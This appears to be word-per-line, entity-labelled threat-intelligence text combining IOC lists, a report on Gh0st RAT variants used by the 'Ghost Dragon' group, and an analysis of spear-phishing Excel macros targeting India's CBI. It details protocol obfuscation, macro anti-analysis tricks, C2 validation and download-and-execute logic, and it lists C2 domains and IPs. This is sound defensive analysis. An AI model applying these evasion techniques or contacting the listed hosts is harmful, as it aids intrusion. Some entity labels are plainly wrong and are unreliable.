ftp.fornobody.dns04.com B_url.unknown
fornobody.dns04.com B_url.unknown
199.192.153.72  B_ip.unknown
fornobody.dns04.com B_url.unknown
-
9/2/2011
www.qwertyui.dns04.com  B_url.unknown
-
2/24/2012
64.71.138.240 B_ip.unknown
www.qwertyui.dns04.com  B_url.unknown
-
3/3/2012
beyondbuck.dns1.us  B_url.unknown
letitsnowsmart.instanthq.com  B_url.unknown
prime98.jumpingcrab.com B_url.unknown
fuck.ruouvangnhatrang.com B_url.unknown
59.188.250.161  B_ip.unknown
www.micro1.zyns.com B_url.unknown
118.99.13.184 B_ip.unknown
www.micro.zyns.com  B_url.unknown
www.micro1.zyns.com B_url.unknown
180.210.204.157 B_ip.unknown
www.qwertyui.dns04.com  B_url.unknown
-
3/2/2011
www.ollay011.zyns.com B_url.unknown
-
3/4/2011
www.olay033.dns04.com B_url.unknown
-
3/12/2011
www.olay044.dns04.com B_url.unknown
-
4/30/2011
9999992009.rr.nu  B_url.unknown
9999992011.rr.nu  B_url.unknown
9999992009.myfw.us  B_url.unknown
64.62.202.82  B_ip.unknown
www.qwertyui.dns04.com  B_url.unknown
-
3/4/2012
microlab.mrslove.com  B_url.unknown
203.80.238.183  B_ip.unknown
www.qwertyui.dns04.com  B_url.unknown
-
10/8/2010
www.olay033.dns04.com B_url.unknown
-
10/4/2010
webhosts.sytes.net  B_url.unknown

APPENDIX
B
:
Phishing
Emails
Associated
with
the
Campaign

Tags
:
CylanceSPEAR
(
http://blog.cylance.com/topic/cylancespear  B_url.normal
)
'
Back
to
Blog
(
http://blog.cylance.com  B_url.normal
)
The
Ghost
Dragon
blog.cylance.com/the-ghost-dragon B_url.normal

By
Isaac
Palmer
April
22
,
2016

Introduction

Cylance
SPEARTM
has
identified
an
APT
group
which
deploys
multiple
customized
malware
implants
,
targeting
mainly
Chinese
and
Russian
users
.

Cylance
determined
that
the
'
Ghost
Dragon
'
group
utilized
specifically
tailored
variants
of
Gh0st B_malware.backdoor
RAT I
,
which
the
group
modified
from
the
3.6
version
of
the
source
code
released
in
2008
.

Newly
implemented
security
mechanisms
in
the
altered
malware
makes
identification
of
Gh0st B_malware.backdoor
RAT I
Command
and
Control
network
traffic
more
difficult
for
both
security
products
and
researchers
.

This
write-up
provides
initial
disclosure
of
a
portion
of
the
malware
and
infrastructure
used
by
the
Ghost
Dragon
group
and
covers
the
new
security
mechanisms
in
detail
,
as
well
as
revealing
how
researchers
were
able
to
communicate
with
the
custom
implant
by
rebuilding
and
compiling
a
customized
Gh0st B_malware.backdoor
RAT I
controller
.

The
Standard
Gh0st B_malware.backdoor
RAT I
Protocol

The
standard
network
protocol
for
Gh0st B_malware.backdoor
RAT I
3.6
employs
zlib
compression
,
which
utilizes
'
Gh0st B_malware.backdoor
'
as
a
static
fivebyte
packet
flag
that
must
be
included
in
the
first
five
bytes
of
initial
transmission
from
the
victim
(
as
seen
in
Figure
1
)
.

During
the
initial
login
request
,
the
3.6
version
of
Gh0st B_malware.backdoor
RAT I
enumerates
system
information
and
transmits
that
information
to
the
controller
.

The
proceeding
eight
bytes
of
the
packet
contain
both
compressed
and
uncompressed
size
information
followed
by
the
zlib
compressed
data
,
starting
with
bytes
78
9C
at
offset
14
(
shown
in
Figures
1
and
2
,
below
)
.

Figure
1
:
Standard
Gh0st B_malware.backdoor
RAT I
3.6
packet
login
request
|

Victim
to
controller

After
a
successful
login
,
the
controller
returns
an
acknowledgment
to
the
victim
with
the
correct
header
using
the
packet
flag
which
it
is
programmed
to
verify
,
as
seen
in
Figure
2
.

The
connection
will
be
established
only
if
the
packet
flags
match
.

Figure
2
:
Standard
Gh0st B_malware.backdoor
RAT I
3.6
packet
response
|
Controller
to
victim
–
22
bytes

Following
the
first
five
bytes
,
the
packet
then
shows
the
full
packet
size
and
the
uncompressed
data
size
.

The
Gh0st B_malware.backdoor
packet
header
for
version
3.6
uses
the
13-byte
format
shown
in
Figure
3
:

Figure
3
:
Gh0st B_malware.backdoor
RAT I
3.6
header
format

After
the
packet
flag
,
packet
length
and
unzip
length
have
been
verified
,
a
working
connection
is
created
between
the
victim
and
the
controller
.

Subsequent
keep-alive
transmissions
ensure
a
continuous
connection
.

Once
Gh0st B_malware.backdoor
RAT I
is
connected
,
the
attacker
has
full
remote
administration
tool
(
RAT
)
functionality
via
the
controller
.

Available
remote
functionality
includes
:
•
Fully
functional
remote
desktop
display
,
including
the
ability
to
remotely
block
user
input
•
Fully
functional
file
manager
that
lists
local
and
network
drives
•
Ability
to
interact
with
running
processes
•
Ability
to
interact
via
the
command
console
•
Key
logging
•
Audio
capture
•
Webcam
capture
•
Ability
to
send
'
Windows
style
'
alerts
to
the
victim
,
which
can
display
any
text
the
attacker
enters
into
the
controller

These
features
ensure
complete
remote
control
of
the
computer
.

Changes
to
the
Gh0st B_malware.backdoor
RAT I
Protocol

In
an
older
version
of
the
customized
Gh0st B_malware.backdoor
RAT I
malware
,
the
protocol
packet
flag
is
no
longer
represented
by
the
string
'
Gh0st B_malware.backdoor
'
.

The
Ghost
Dragon
group
modified
the
source
code
and
changed
the
packet
flag
to
'
XYTvn
'
,
as
seen
in
Figure
4
.

The
packet
structure
still
implements
the
same
13-byte
header
format
,
including
the
starting
zlib
compression
bytes
of
'
78
9C
'
:

Figure
4
:
XYTvn
static
packet
flag
|
Victim
to
controller
login
request

Sample
:
f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197  B_hash

In
a
more
recent
version
of
the
modified
Gh0st B_malware.backdoor
RAT I
malware
,
Ghost
Dragon
implemented
dynamic
packet
flags
which
change
the
first
five
bytes
of
the
header
in
every
login
request
with
the
controller
.

This
complicates
identifying
its
network
traffic
,
as
the
header
bytes
in
the
zlib
compressed
data
section
no
longer
start
with
'
78
9C
'
,
as
shown
in

Figure
5
.

In
some
cases
this
was
achieved
through
a
simple
XOR
obfuscation
of
the
packet
data
,
beginning
with
the
zlib
header
.

SPEAR
has
observed
numerous
different
XOR
keys
utilized
by
the
group
.

No
changes
to
the
compression
have
been
found
;
however
,
it
is
trivial
to
implement
a
modified
compression
protocol
.

Figure
5
:
Dynamic
packet
flag
|
Victim
to
controller
login
request

Sample
:
1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42  B_hash
(
Note
:
At
the
time
of
this
report
,
the
C2
for
the
sample
was
active
and
the
malware
could
still
establish
an
active
connection
to
the
Ghost
Dragon
controller
at
bbs.winupdate[dot]net B_url.cncsvr
.

Currently
,
the
domain
bbs.winupdate[dot]net B_url.cncsvr
resolves
to
122.10.18[dot]166 B_ip.cncsvr
)
.

The
reply
from
the
active
command
and
control
server
can
be
seen
in
Figure
6
:

Figure
6
:
Dynamic
packet
flag
|
Controller
to
victim
login
reply

Sample
:
1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42  B_hash

Connecting
to
the
Ghost
Dragon
Malware

After
successful
identification
of
the
malware
as
Gh0st B_malware.backdoor
RAT I
and
confirmation
of
the
modified
command
and
control
protocol
,
the
final
step
toward
verification
was
to
connect
with
the
malware
to
ensure
that
it
would
parse
the
normal
Gh0st B_malware.backdoor
RAT I
commands
.

I
was
able
to
compile
a
custom
controller
from
the
source
code
for
the
purposes
of
testing
the
Ghost
Dragon
malware
.

I
bypassed
the
header
checks
looking
for
the
'
Gh0st B_malware.backdoor
'
packet
flag
,
and
reprogrammed
the
standard
Gh0st B_malware.backdoor
RAT
controller
to
reply
with
the
packet
flag
sent
from
the
victim
.

I
used
sample
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df  B_hash
for
testing
,
which
was
executed
by
f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197  B_hash
during
analysis
on
Windows
XP
.

This
sample
transmitted
the
static
five
byte
packet
flag
'
XYTvn
'
.

I
ran
the
victim
malware
and
changed
the
host's
file
to
point
the
domain
to
a
host-only
IP
address
.

I
received
a
connection
attempt
from
the
victim
and
a
response
from
the
controller
returned
the
correct
packet
flag
.

Afterward
,
the
keep-alive
packets
between
the
victim
and
controller
maintained
the
connection
,
which
allowed
me
to
test
the
functionality
of
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df  B_hash
with
the
custom
Gh0st B_malware.backdoor
RAT I
controller
.

The
following
screen
shots
were
obtained
while
connected
to
the
malware
:

Figure
7
:
Main
connection
view
|
Connected
to
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df  B_hash

The
HOSTNAME
field
shown
in
Figure
7
was
programmed
in
my
custom
controller
to
display
'
Gh0st B_malware.backdoor
variant
'
,
just
in
case
the
incoming
structure
parsed
from
the
victim
did
not
match
the
format
of
the
default
'
LOGININFO
'
structure
from
Gh0st B_malware.backdoor
RAT I
3.6
.

I
attained
full
functionality
using
the
Gh0st B_malware.backdoor
3.6
protocol
in
the
controller
,
despite
the
fact
that
the
incoming
structure
was
not
exactly
what
my
customized
controller
expected
.

As
shown
in
Figure
8
,
I
successfully
added
an
administrative
user
while
remotely
connected
via
my
custom
Gh0st B_malware.backdoor
RAT I
console
within
the
malware
dropped
from
sample
f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197  B_hash
.

Figure
8
demonstrates
that
some
of
the
characters
in
the
window
are
not
in
English
and
are
not
displayed
properly
on
the
form
.

This
is
due
to
the
fact
that
the
characters
were
written
in
Mandarin
in
the
original
Gh0st B_malware.backdoor
RAT I
3.6
source
.

I
changed
phrases
in
the
main
connection
window
(
Figure
7
)
for
demonstration
purposes
only
.

Figure
8
:
Remote
shell
|
Adding
admin
user
|
Connected
to
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df  B_hash

The
remaining
features
of
the
Gh0st B_malware.backdoor
RAT I
protocol
were
tested
successfully
with
the
custom
Gh0st B_malware.backdoor
RAT I
controller
while
connected
to
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df  B_hash
.

Additional
analysis
into
other
samples
is
ongoing
and
more
information
will
be
forthcoming
.

Network
IOCs
and
Infrastructure
Overlap

A48f881f254dc8452561a8f13e2fb81933473ff22e549787f0ca67f19ba7fe67  B_hash

File
name
:
Air
China
2015
April
TIMETABLE
.xls

Malware
type
:
Initial
Infection
Vector
/
XLS
file

Network
Activity
Summary
:
Drops
the
downloader
71a52058f6b5cef66302c19169f67cf304507b4454cca83e2c36151da8da1d97  B_hash
71a52058f6b5cef66302c19169f67cf304507b4454cca83e2c36151da8da1d97  B_hash

File
name
:
AdobeWpkReg.tmp

Malware
type
:
Downloader

Network
Activity
Summary
:
Uses
HEAD
method
(
instead
of
GET
)
|
Calls
out
to
info.winupdate[dot]net/robots.txt B_url.cncsvr
|

User-Agent
:
Mozilla/5.0
(
compatible;
MSIE
10.0;
NULL[5(1)]Windows
NT
6.1;
Trident/6.0
)

Note
:
User
Agent
is
variable
depending
on
the
version
info
of
the
host
1be9c68b31247357328596a388010c9cfffadcb6e9841fb22de8b0dc2d161c42  B_hash

File
name
:
iconfig.exe

Malware
type
:
Gh0st B_malware.backdoor
RAT I
variant

Network
Activity
Summary
:
bbs.winupdate[dot]net B_url.cncsvr
|
Port
8080

Packet
flag
:
Dynamic
f9a669d22866cd041e2d520c5eb093188962bea8864fdfd0c0abb2b254e9f197  B_hash

File
name
:
install.exe

Malware
type
:
Gh0st B_malware.backdoor
RAT I
variant

Network
Activity
Summary
:
ooxxxoo.gicp[dot]net  B_url.cncsvr
|
Port
8080
|
Also
connects
to
www.winupdate[dot]net B_url.cncsvr
on
port
8080

Packet
flag
:
Static
:
XYTvn

Note
:
On
Windows
XP
,
may
drop
a
replacement
DLL
for
the
AppMgmt
service
using
ClimateVMain
export

SVC_sha256
:
6c7f8ba75889e0021c4616fcbee86ac06cd7f5e1e355e0cbfbbb5110c08bb6df  B_hash
.

The
hash
of
the
dropped
file
may
change
on
different
versions
of
Microsoft
Windows
99ee5b764a5db1cb6b8a4f62605b5536487d9c35a28a23de8f9174659f65bcb2  B_hash

File
name
:
install.exe

Malware
type
:
Gh0st B_malware.backdoor
RAT I
variant

Network
Activity
Summary
:
www.searchhappynews[dot]com B_url.cncsvr
|
Port
80

Packet
flag
:
Static
|
XYTvn
b803381535ac24ce7c8fdcf6155566d208dfca63fd66ec71bbc6754233e251f5  B_hash

File
name
:
ExtensionManager.exe

Malware
type
:
Gh0st B_malware.backdoor
RAT I
variant

Network
Activity
Summary
:
www.fhtd[dot]info B_url.cncsvr
|
Port
1081

Packet
flag
:
Dynamic

Infrastructure
Overlap

Domain
|
Previous
IP
resolution
bbs.winupdate[dot]net B_url.cncsvr
|
122.10.18.166 B_ip.cncsvr
www.fhtd[dot]info B_url.cncsvr
|
122.10.18.166 B_ip.cncsvr
info.winupdate[dot]net  B_url.cncsvr
|
122.10.36.94  B_ip.cncsvr

During
investigation
into
the
infrastructure
used
by
Ghost
Dragon
,
an
anonymous
FTP
server
was
discovered
on
one
of
the
IP
addresses
listed
above
,
which
hosted
'
info.winupdate[dot]net  B_url.cncsvr
|
122.10.36.94  B_ip.cncsvr
'
.

Upon
obtaining
the
files
on
the
FTP
server
,
an
older
Gh0st B_malware.backdoor
RAT I
variant
was
obtained
with
the
file
name
'
operas.exe
'
.
This
variant
sends
the
system
info
to
the
controller
in
clear
text
for
the
login
request
.
fb5a7cb34040b1e98b077edaf91cb59a446d8ff07263afe875cf6bd85bfb359d  B_hash

File
name
:
operas.exe

Malware
type
:
Gh0st B_malware.backdoor
RAT I
variant

Network
Activity
Summary
:
www.swgabeg[dot]com B_url.cncsvr
|
Port
1080
|
Clear
text
login
request
sent
to
controller

Packet
flag
:
Dynamic

Appendix  B_url.cncsvr
A I
–
IP
and
Domain
Listing

IP
addresses
:
101.55.33.39  B_ip.cncsvr
103.232.215.144 B_ip.cncsvr
103.246.245.147 B_ip.cncsvr
111.68.8.130  B_ip.cncsvr
112.125.17.103  B_ip.cncsvr
113.10.148.161  B_ip.cncsvr
113.10.148.205  B_ip.cncsvr
122.10.18.166 B_ip.cncsvr
122.10.36.94  B_ip.cncsvr
122.10.41.85  B_ip.cncsvr
122.10.83.75  B_ip.cncsvr
122.10.85.35  B_ip.cncsvr
122.9.247.128 B_ip.cncsvr
122.9.247.134 B_ip.cncsvr
122.9.247.216 B_ip.cncsvr
122.9.247.56  B_ip.cncsvr
123.254.111.87  B_ip.cncsvr
142.4.103.90  B_ip.cncsvr
174.128.255.228 B_ip.cncsvr
175.45.192.234  B_ip.cncsvr
202.172.32.172  B_ip.cncsvr
202.174.130.116 B_ip.cncsvr
203.232.28.10 B_ip.cncsvr
209.85.84.165 B_ip.cncsvr
209.85.84.167 B_ip.cncsvr
31.170.179.179  B_ip.cncsvr
58.64.187.22  B_ip.cncsvr
60.215.128.246  B_ip.cncsvr
64.111.220.218  B_ip.cncsvr

Domains
:
info.winupdate[dot]net  B_url.cncsvr
bbs.winupdate[dot]net B_url.cncsvr
ooxxxoo.gicp[dot]net  B_url.cncsvr
www.winupdate[dot]net B_url.cncsvr
www.searchhappynews[dot]com B_url.cncsvr
www.fhtd[dot]info B_url.cncsvr
www.swgabeg[dot]com B_url.cncsvr

Tags
:
Gh0st B_malware.backdoor
Dragon
,
Gh0st B_malware.backdoor
RAT I
Cyber
Attack
Impersonating
Identity
of
Indian
Think
Tank
to
Target
Central
Bureau
of
Investigation
(
CBI
)
and
Possibly
Indian
Army
Officials
cysinfo.com/cyber-attack-targeting-cbi-and-possibly-indian-army-officials/  B_url.normal

In
my
previous
blog
posts
I
posted
details
of
cyber
attacks
targeting
Indian
Ministry
of
External
Affairs
and
Indian
Navy's
Warship
and
Submarine
Manufacturer
.

This
blog
post
describes
another
attack
campaign
where
attackers
impersonated
identity
of
Indian
think
tank
IDSA
(
Institute
for
Defence
Studies
and
Analyses
)
and
sent
out
spear-phishing  B_malware.infosteal
emails
to
target
officials
of
the
Central
Bureau
of
Investigation
(
CBI
)
and
possibly
the
officials
of
Indian
Army
.

5/11/2017

IDSA
(
Institute
for
Defence
Studies
and
Analyses
)
is
an
Indian
think
tank
for
advanced
research
in
international
relations
,
especially
strategic
and
security
issues
,
and
also
trains
civilian
and
military
officers
of
the
Government
of
India
and
deals
with
objective
research
and
policy
relating
to
all
aspects
of
defense
and
National
security
.

The
Central
Bureau
of
Investigation
(
CBI
)
is
the
domestic
intelligence
and
security
service
of
India
and
serves
as
the
India's
premier
investigative
and
Interpol
agency
operating
under
the
jurisdiction
of
the
Government
of
India
.

In
order
to
infect
the
victims
,
the
attackers
distributed
spear-phishing  B_malware.infosteal
emails
containing
malicious
excel
file
which
when
opened
dropped
a
malware
capable
of
downloading
additional
components
and
spying
on
infected
systems
.

To
distribute
the
malicious
excel
file
,
the
attackers
registered
a
domain
which
impersonated
the
identity
of
most
influential
Indian
think
tank
IDSA
(
Institute
for
Defence
Studies
and
Analyses
)
and
used
the
email
id
from
the
impersonating
domain
to
send
out
the
spear-phishing  B_malware.infosteal
emails
to
the
victims
.

Overview
of
the
Malicious
Emails

In
the
first
wave
of
attack
,
The
attackers
sent
out
spear-phishing  B_malware.infosteal
emails
containing
malicious
excel
file
(
Case
Detail
of
Suspected
abuser.xls
)
to
an
unit
of
Central
Bureau
of
Investigation
(
CBI
)
on
February
21st
,
2017
and
the
email
was
sent
from
an
email
id
associated
with
an
impersonating
domain
idsadesk[.]in B_url.unknown
.

To
lure
the
victims
to
open
the
malicious
attachment
the
email
subject
relevant
to
the
victims
were
chosen
and
to
avoid
suspicion
the
email
was
made
to
look
like
it
was
sent
by
a
person
associated
with
IDSA
asking
to
take
action
against
a
pending
case
as
shown
in
the
screen
shot
below
.

1/33

In
the
second
wave
of
attack
,
a
spear-phishing  B_malware.infosteal
email
containing
a
different
malicious
excel
file
(
Contact
List
of
attendees.xls
)
was
sent
to
an
email
id
on
the
same
day
February
21st
,
2017
.

The
email
was
made
to
look
like
a
person
associated
with
IDSA
is
asking
to
confirm
the
phone
number
of
an
attendee
in
the
attendee
list
.

When
the
victim
opens
the
attached
excel
file
it
drops
the
malware
and
displays
a
decoy
excel
sheet
containing
the
list
of
names
,
which
seems
be
the
names
of
senior
army
officers
.

Even
though
the
identity
of
the
recipient
email
could
not
be
fully
verified
as
this
email
id
is
nowhere
available
on
the
internet
but
based
on
the
format
of
the
recipient
email
id
and
from
the
list
of
attendees
that
is
displayed
to
the
victim
in
the
decoy
excel
file
,
the
recipient
email
could
be
possibly
be
associated
with
either
the
Indian
Army
or
a
Government
entity
.

This
suggests
that
attackers
had
prior
knowledge
of
the
recipient
email
id
through
other
means
.

In
both
the
cases
when
the
victims
opens
the
attached
malicious
excel
file
the
same
malware
sample
was
dropped
and
executed
on
the
victim's
system
.

From
the
emails
(
and
the
attachments
)
it
looks
like
the
goal
of
the
attackers
was
to
infect
and
take
control
of
the
systems
and
to
spy
on
the
victims
.

Anti-Analysis
Techniques
in
the
Malicious
Excel
File

When
the
victim
opens
the
attached
excel
file
it
prompts
the
user
to
enable
macro
content
as
shown
in
the
below
2/33
screen
shot
.

To
prevent
viewing
of
the
macro
code
and
to
make
manual
analysis
harder
attackers
password
protected
the
macro
content
as
show
below
.

Even
though
the
macro
is
password
protected
,
It
is
possible
to
extract
macro
code
using
analysis
tools
like
oletools
.

In
this
case
oletools
was
used
to
extract
the
macro
content
but
it
turns
out
that
the
oletools
was
able
to
extract
only
partial
macro
content
but
it
failed
to
extract
the
malicious
content
present
inside
a
Textbox
within
the
Userform
.

Below
screen
shot
shows
the
macro
content
extracted
by
the
oletools
.

3/33

This
extracted
macro
content
was
copied
to
new
excel
workbook
and
the
environment
was
setup
to
debug
the
macro
code
.

Debugging
the
macro
code
failed
because
the
macro
code
accesses
the
textbox
content
within
the
UserForm
(
which
oletools
failed
to
extract
)
.

The
technique
of
storing
the
malicious
content
inside
the
TextBox
within
the
UserForm
allowed
the
attackers
to
bypass
analysis
tools
.

Below
screen
shot
shows
the
macro
code
accessing
the
content
from
the
TextBox
and
the
error
triggered
by
the
code
due
to
the
absence
of
the
TextBox
content
.

To
bypass
the
anti-analysis
technique
and
to
extract
the
content
stored
in
the
TextBox
within
the
UserForm
the
password
protection
was
bypassed
which
allowed
to
extract
the
content
stored
within
the
UserForm
.

Below
screen
shot
shows
the
TextBox
content
stored
within
the
UserForm
.

4/33

At
this
point
all
the
components
(
macro
code
and
the
UserForm
content
)
required
for
analysis
was
extracted
and
an
environment
similar
to
the
original
excel
file
was
created
to
debug
the
malicious
macro
.

Below
screen
shots
show
the
new
excel
file
containing
extracted
macro
code
and
the
UserForm
content
.

Analysis
of
Malicious
Excel
File

When
the
victim
opens
the
excel
file
and
enables
the
macro
content
,
The
malicious
macro
code
within
the
excel
file
is
executed
.

The
macro
code
first
generates
a
random
filename
as
shown
in
the
below
screen
shot
.

5/33

It
then
reads
the
executable
content
stored
in
the
TextBox
within
the
UserForm
and
then
writes
the
executable
content
to
the
randomly
generate
filename
in
the
%AppData%
directory
.

The
executable
is
written
in
.NET
framework

The
content
stored
in
the
TexBox
within
the
UserForm
is
an
executable
content
in
the
decimal
format
.

Below
screen
shot
shows
converted
data
from
decimal
to
text
.

In
this
case
the
attackers
used
the
TextBox
within
the
UserForm
to
store
the
malicious
executable
content
.

6/33

The
dropped
file
in
the
%AppData%
directory
is
then
executed
as
shown
in
the
below
screen
shot
.

7/33

Once
the
dropped
file
is
executed
it
copies
itself
into
%AppData%\SQLite
directory
as
SQLite.exe
and
executes
as
shown
below
.

As
a
result
of
executing
SQLite.exe
it
makes
a
HTTP
connection
to
the
C2
server
(
qhavcloud[.]com B_url.cncsvr
)
.

The
C2
communication
shown
below
contains
a
hard
coded
user-agent
and
the
double
slash
(
//
)
in
the
GET
request
this
can
be
used
to
create
network
based
signatures
.

8/33

Reverse
Engineering
the
Dropped
File
(
SQLite.exe
)

The
dynamic
/
sandbox
analysis
did
not
reveal
much
about
the
functionality
of
the
malware
,
in
order
to
understand
the
capabilities
of
the
malware
,
the
sample
had
be
reverse
engineered
.

The
malware
sample
was
reverse
engineered
in
an
isolated
environment
(
without
actually
allowing
it
to
connect
to
the
c2
server
)
.

This
section
contains
reverse
engineering
details
of
this
malware
and
its
various
features
.

a
)
Malware
Validates
C2
Connection

Malware
checks
if
the
executable
is
running
as
SQLite.exe
from
%AppData%\SQLite
directory
,
if
not
it
copies
itself
as
SQLite.exe
to
%AppData%\SQLite
directory
as
shown
below
.

It
then
launches
the
executable
(
SQLite.exe
)
with
the
command
line
arguments
as
shown
in
the
below
screen
shots
.

Malware
performs
multiple
checks
to
make
sure
that
it
is
connecting
to
the
correct
C2
server
before
doing
anything
malicious
.

first
its
pings
the
C2
domain
qhavcloud[.]com B_url.cncsvr
.

Below
screen
shots
show
the
ping
to
the
C2
server
.

9/33

If
the
ping
succeeds
then
it
determines
if
C2
server
is
alive
by
sending
an
HTTP
request
,
it
then
reads
the
content
from
the
C2
server
and
looks
for
a
specific
string
'
Connection
!
'
.

If
it
does
not
find
the
string
'
Connection
!
'
it
assumes
that
C2
is
not
alive
or
it
is
connecting
to
the
wrong
C2
server
.

This
technique
allows
the
attackers
to
validate
if
they
are
connecting
to
the
correct
C2
server
and
also
this
technique
does
not
reveal
any
malicious
behavior
in
dynamic
/
sandbox
analysis
until
the
correct
response
is
given
to
the
malware
.

Below
screen
shots
show
the
code
that
is
performing
the
C2
connection
and
the
validation
.

If
the
ping
does
not
succeed
or
if
the
C2
response
does
not
contain
the
string
'
Connection
!
'
then
the
malware
gets
10/33
the
list
of
backup
C2
servers
to
connect
by
downloading
a
text
file
from
the
Google
drive
link
.

This
technique
of
storing
a
text
file
containing
the
list
of
backup
C2
servers
on
the
legitimate
site
has
advantages
and
it
is
highly
unlikely
to
trigger
any
suspicion
in
security
monitoring
and
also
can
bypass
reputation
based
devices
.

Below
screen
shots
show
the
code
that
downloads
the
text
file
and
text
file
(
info.txt
)
saved
on
the
disk
.

During
the
time
of
analysis
the
text
file
downloaded
from
the
Google
drive
link
was
populated
with
two
private
IP
addresses
,
it
looks
like
the
attackers
deliberately
populated
the
IP
addresses
with
two
private
IP
addresses
to
prevent
the
researchers
from
determining
actual
IP
/
domain
names
of
the
backup
C2
servers
.

Below
screen
shot
shows
the
IP
addresses
in
the
text
file
.

Once
the
text
file
is
downloaded
the
malware
reads
each
and
every
IP
address
from
the
text
file
and
performs
the
same
C2
validation
check
(
ping
and
checks
for
the
string
'
Connection
!
'
from
the
C2
response
)
.

Below
screen
shot
shows
the
HTTP
connection
made
to
those
IP
addresses
.

11/33
b
)
Malware
Sends
System
Information

Based
on
the
analysis
it
was
determined
that
the
malware
looks
for
a
string
'
Connection
!
'
in
the
C2
response
,
so
the
analysis
environment
was
configured
to
respond
with
a
string
'
Connection
!
'
whenever
the
malware
made
a
C2
connection
.

Below
screen
shot
shows
the
C2
communication
made
by
the
malware
and
the
expected
response
.

Once
the
malware
validates
the
C2
connection
then
the
malware
creates
an
XML
file
(
SQLite.xml
)
inside
which
it
stores
the
user
name
and
the
password
to
communicate
with
the
C2
server
.

Malware
generates
the
user
name
to
communicate
with
the
C2
by
concatenating
a
)
the
machine
name
,
b
)
a
random
number
between
1000
to
9999
and
c
)
the
product
version
of
the
file
.

Below
screen
shot
shows
the
code
that
generates
the
user
name

Malware
generates
the
password
to
communicate
with
the
C2
by
building
an
array
of
16
random
bytes
,
these
random
bytes
are
then
encoded
using
base64
encoding
algorithm
and
malware
then
replaces
the
characters
'
+
'
and
12/33
'
/
'
with
'
-
'
and
'
_
'
respectively
from
the
encoded
data
.

The
attackers
use
the
technique
of
replacing
the
standard
characters
with
custom
characters
to
makes
it
difficult
to
decode
the
string
(
containing
the
characters
'
+
'
and
'
/
'
)
using
standard
base64
algorithm
.

Below
screen
shot
shows
the
code
that
generates
the
password
.

Once
the
user
name
and
password
is
generated
,
malware
then
creates
an
XML
file
(
SQLITE.xml
)
and
populates
the
XML
file
with
the
generated
user
name
and
password
.

Below
screen
shot
shows
the
code
that
creates
the
XML
file

Below
screen
shot
shows
the
XML
file
populated
with
the
user
name
and
the
password
which
is
used
by
the
malware
to
communicate
with
the
C2
server
.

The
malware
then
collects
system
information
like
the
computer
name
,
operating
system
caption
,
IP
address
of
the
infected
system
,
product
version
of
the
executable
file
and
sends
it
to
the
C2
server
along
with
the
generated
user
13/33
name
and
password
using
a
POST
request
to
postdata.php
.

Below
screen
shots
show
the
code
that
collects
the
system
information
and
the
data
that
is
sent
to
the
attacker
.

c
)
Malware
Sends
Process
Information

Malware
then
enumerates
the
list
of
all
the
processes
running
on
the
system
and
sends
it
to
the
C2
server
along
with
the
user
name
and
password
using
a
POST
request
to
JobProcesses.php
as
shown
in
the
below
screen
shots
.

This
allows
the
attackers
to
know
which
programs
are
running
on
the
system
or
if
any
analysis
tools
are
used
to
inspect
the
malware
.

14/33

Malware
Functionalities

Apart
from
sending
the
system
information
and
process
information
to
the
C2
server
,
the
malware
also
has
the
capability
to
perform
various
other
tasks
by
taking
command
from
the
C2
.

This
section
focuses
on
different
functionalities
of
the
malware
a
)
Download
&
Execute
Functionality
1

Malware
triggers
the
download
functionality
by
connecting
to
the
C2
server
and
making
a
request
to
either
Jobwork1.php
or
Jobwork2.php
,
if
the
C2
response
satisfies
the
condition
then
it
downloads
&
executes
the
file
.

After
understanding
the
logic
(
logic
is
mentioned
below
)
&
to
satisfy
the
condition
the
environment
was
configured
to
give
proper
response
whenever
the
malware
made
a
request
to
Jobwork1.php
or
Jobwork2.php
.

Below
screen
shot
shows
the
response
given
to
the
malware
.
15/33

Malware
then
reads
the
response
successfully
as
shown
in
the
below
screen
shot
.

from
the
C2
response
it
extracts
two
things
a
)
URL
to
download
an
executable
file
and
b
)
the
command
string
that
will
trigger
the
download
functionality

From
the
C2
response
the
URL
is
extracted
starting
from
offset
14
(
i.e
15th
character
)
and
it
determines
the
length
of
the
string
(
URL
)
to
extract
by
finding
the
start
offset
of
the
string
'
clientpermission
'
once
it
finds
it
,
its
offset
value
is
subtracted
with
17
.

The
command
string
to
trigger
the
download
functionality
is
extracted
from
the
C2
response
using
the
logic
shown
below
.

Below
screen
shot
shows
the
logic
used
to
extract
the
URL
and
the
command
strings
,
in
the
below
screen
shot
the
extracted
command
string
is
stored
in
the
variable
ServerTask1Permission
.

16/33

Once
the
URL
and
command
string
is
extracted
,
the
malware
compares
the
command
string
with
the
string
'
Pending
'
,
only
if
the
command
string
matches
with
string
'
Pending
'
the
download
functionality
is
triggered
.

When
all
the
above
mentioned
conditions
are
satisfied
the
malware
downloads
the
executable
from
the
URL
extracted
from
the
C2
response
.

Below
screen
shot
shows
the
URL
extracted
from
the
C2
response
.

Note
:
In
the
below
screen
shot
the
URL
(
hxxp://c2xy.com/a.exe B_url.unknown
)
is
not
the
actual
URL
used
by
the
malware
for
downloading
the
file
,
this
is
a
test
URL
used
to
determine
the
functionality
,
so
this
URL
should
not
used
as
an
indicator
.

Below
screen
shot
shows
the
network
traffic
of
malware
trying
to
download
the
executable
file
from
the
extracted
URL
.

17/33

The
downloaded
executable
is
saved
in
the
%AppData%\SQLite
directory
as
shown
in
the
below
screen
shot
.

The
downloaded
file
is
then
executed
by
the
malware
as
shown
in
the
below
screen
shot
.

Once
the
downloaded
file
is
executed
the
malware
reports
that
the
download
&
execute
was
successful
by
making
a
POST
request
to
JobDone.php
as
shown
in
the
below
screen
shots
18/33

This
functionality
allows
the
attacker
to
change
their
hosting
site
(
from
where
the
malware
will
be
downloaded
)
,
this
can
be
achieved
by
changing
the
C2
response
containing
different
URL
.

b
)
Download
&
Execute
Functionality
2

Malware
also
supports
second
type
of
download
functionality
,
